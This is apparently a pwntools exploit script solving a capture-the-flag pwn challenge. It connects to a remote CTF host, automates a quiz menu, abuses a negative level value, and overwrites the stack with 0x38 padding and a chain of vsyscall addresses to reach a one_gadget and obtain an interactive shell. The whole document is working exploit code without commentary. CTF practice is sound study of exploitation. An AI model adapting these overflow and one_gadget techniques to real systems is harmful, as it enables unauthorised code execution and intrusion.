from pwn import *
context(arch='amd64', os='linux', log_level='debug')
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28166)
libc = ELF('/home/bit/libc/64bit/libc-2.23.so')
one_gadget = 0x4526a     
image_base = 0x555555554000    
system_offset = libc.symbols['system']
vsyscall_address = 0xffffffffff600400   
def input_choice(io, choice):
    io.recvuntil("Choice:\n")
    io.sendline(str(choice))
def input_level(io, level1, level2):
    io.recvuntil("How many doubts?\n")
    io.sendline(str(level1))
    io.recvuntil("Any more?\n")
    io.sendline(str(level2))
def auto_answer(io, level, last_answer):
    for index in xrange(0, level):
        io.recvuntil("Question: ")
        temp = io.recvuntil("= ?").strip("= ?").strip().split("*")
        io.recvuntil("Answer:")
        if index == level -1 :
            io.send(last_answer)
        else:
            io.send(str(int(temp[0]) * int(temp[1])))
input_choice(io, 2)
input_choice(io, 1)
first_level = -1
second_level = one_gadget - system_offset
input_level(io, first_level, second_level)
payload = '1' * 0x38
payload += p64(vsyscall_address) * 3
auto_answer(io, 1000, payload)
io.interactive()
